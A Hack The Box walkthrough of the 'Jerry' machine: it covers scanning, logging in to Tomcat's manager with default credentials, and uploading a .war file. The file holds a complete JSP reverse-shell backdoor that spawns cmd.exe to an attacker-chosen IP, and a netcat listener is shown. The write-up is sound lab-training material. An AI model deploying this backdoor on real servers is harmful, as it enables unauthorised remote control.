# Jerry-HTB - this machine is OLD and it SUCKED
```bash sudo nmap -T4 --min-rate 1000 -A -sC -p8080 jerry.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 15:07 -0300
Nmap scan report for jerry.htb (10.129.136.9)
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   83.90 ms 10.10.16.1
2   84.01 ms jerry.htb (10.129.136.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
```

At port 8080, we have a instance of apache tomcat a webserver proxy from apache. Let's fuzz it:
```bash
ffuf -w ../../../../SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://jerry.htb:8080/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jerry.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /home/spaz/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 198ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
:: Progress: [62281/62281] :: Job [1/1] :: 701 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
```
From these manager is interesting, if we try to access it it asks for credentials that can bee faound in googlem thay are (tomcat/s3cret):
<img width="1919" height="921" alt="image" src="https://github.com/user-attachments/assets/87cad964-9bfc-4cb1-a4b0-e8e4bec01401" />

Inside the tomcat manager page we can find this:
<img width="1919" height="801" alt="image" src="https://github.com/user-attachments/assets/cb5e3ac4-ce9a-498a-8666-c715cbc9046c" />

So what we must do here is upload a malicious .war file and get reverse shell. First, create a revshell.jsp:
```bash
└─$ cat revshell.jsp
<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe) {}
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe) {}
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) {}
}
%>
```
Then create a WEB-INF directory and inside it create a web.xml.
```bash
└─$ cat web.xml     
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
  <welcome-file-list>
    <welcome-file>revshell.jsp</welcome-file>
  </welcome-file-list>
</web-app>
```
This xml is necessary so the server can be instructed to read your malicious payload. By now you working folder should look like this:
<img width="698" height="52" alt="image" src="https://github.com/user-attachments/assets/89a42470-badc-4497-b947-fb263df70e04" />

Now finally, just create a folder called revshell and compress it into a .war file. The command is as follows:
```bash
 jar -cvf reverse.war -C revshell .
 ```
 The result:
 <img width="767" height="42" alt="image" src="https://github.com/user-attachments/assets/75a3d00a-960f-4443-a6fd-00cb1b7875be" />

Now upload this into the Tomcat server:
<img width="1206" height="850" alt="image" src="https://github.com/user-attachments/assets/37c72e56-0158-4f1f-b6af-8dcadcf6bd49" />
<img width="1907" height="107" alt="image" src="https://github.com/user-attachments/assets/3c1f367d-bf5e-4e0c-a526-32b27f9f4a3f" />

Execute it and you'll get:
<img width="1918" height="758" alt="Captura de tela 2026-06-14 103848" src="https://github.com/user-attachments/assets/9c10f795-2969-4cc4-bb90-a5153f53cd77" />

Open a listener
```bash
nc -lnvp 4444
```
Input your IP and desired connection port, launch it and get shell:
<img width="703" height="153" alt="Captura de tela 2026-06-11 155437" src="https://github.com/user-attachments/assets/e0313fbd-438a-446f-889d-cf32c8b259b5" />
<img width="887" height="329" alt="Captura de tela 2026-06-11 155048" src="https://github.com/user-attachments/assets/07a17251-a032-4a7d-8e04-4507a23a20b9" />

Notes: This machine is very easy but I encountered some problems when trying the usual from https://www.revshells.com/ I had to modify the Java Web page so I could use it here there were problems with the try catch structures, i'm not very good with java but the server error messages helped a lot with it.























